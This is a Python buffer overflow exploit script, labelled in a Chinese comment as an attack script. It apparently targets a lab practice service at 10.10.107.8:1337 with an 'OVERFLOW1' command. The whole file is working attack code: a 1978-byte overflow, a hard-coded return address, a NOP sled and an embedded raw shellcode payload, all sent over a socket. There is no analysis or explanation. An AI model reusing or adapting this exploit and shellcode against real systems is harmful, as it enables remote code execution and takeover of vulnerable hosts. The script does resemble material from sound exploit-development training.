#coding=utf-8
#!/usr/bin/python

#攻击脚本

import socket

ip = "10.10.107.8"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978 
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"

padding = "\x90" * 16

buf = ""
buf+="\xbd\x1b\x90\x6d\x5c\xdd\xc1\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
buf+="\x52\x83\xc2\x04\x31\x6a\x0e\x03\x71\x9e\x8f\xa9\x79\x76\xcd"
buf+="\x52\x81\x87\xb2\xdb\x64\xb6\xf2\xb8\xed\xe9\xc2\xcb\xa3\x05"
buf+="\xa8\x9e\x57\x9d\xdc\x36\x58\x16\x6a\x61\x57\xa7\xc7\x51\xf6"
buf+="\x2b\x1a\x86\xd8\x12\xd5\xdb\x19\x52\x08\x11\x4b\x0b\x46\x84"
buf+="\x7b\x38\x12\x15\xf0\x72\xb2\x1d\xe5\xc3\xb5\x0c\xb8\x58\xec"
buf+="\x8e\x3b\x8c\x84\x86\x23\xd1\xa1\x51\xd8\x21\x5d\x60\x08\x78"
buf+="\x9e\xcf\x75\xb4\x6d\x11\xb2\x73\x8e\x64\xca\x87\x33\x7f\x09"
buf+="\xf5\xef\x0a\x89\x5d\x7b\xac\x75\x5f\xa8\x2b\xfe\x53\x05\x3f"
buf+="\x58\x70\x98\xec\xd3\x8c\x11\x13\x33\x05\x61\x30\x97\x4d\x31"
buf+="\x59\x8e\x2b\x94\x66\xd0\x93\x49\xc3\x9b\x3e\x9d\x7e\xc6\x56"
buf+="\x52\xb3\xf8\xa6\xfc\xc4\x8b\x94\xa3\x7e\x03\x95\x2c\x59\xd4"
buf+="\xda\x06\x1d\x4a\x25\xa9\x5e\x43\xe2\xfd\x0e\xfb\xc3\x7d\xc5"
buf+="\xfb\xec\xab\x4a\xab\x42\x04\x2b\x1b\x23\xf4\xc3\x71\xac\x2b"
buf+="\xf3\x7a\x66\x44\x9e\x81\xe1\x61\x4e\x80\x2b\x1d\x72\x92\xda"
buf+="\x82\xfb\x74\xb6\x2a\xaa\x2f\x2f\xd2\xf7\xbb\xce\x1b\x22\xc6"
buf+="\xd1\x90\xc1\x37\x9f\x50\xaf\x2b\x48\x91\xfa\x11\xdf\xae\xd0"
buf+="\x3d\x83\x3d\xbf\xbd\xca\x5d\x68\xea\x9b\x90\x61\x7e\x36\x8a"
buf+="\xdb\x9c\xcb\x4a\x23\x24\x10\xaf\xaa\xa5\xd5\x8b\x88\xb5\x23"
buf+="\x13\x95\xe1\xfb\x42\x43\x5f\xba\x3c\x25\x09\x14\x92\xef\xdd"
buf+="\xe1\xd8\x2f\x9b\xed\x34\xc6\x43\x5f\xe1\x9f\x7c\x50\x65\x28"
buf+="\x05\x8c\x15\xd7\xdc\x14\x35\x3a\xf4\x60\xde\xe3\x9d\xc8\x83"
buf+="\x13\x48\x0e\xba\x97\x78\xef\x39\x87\x09\xea\x06\x0f\xe2\x86"
buf+="\x17\xfa\x04\x34\x17\x2f";

payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

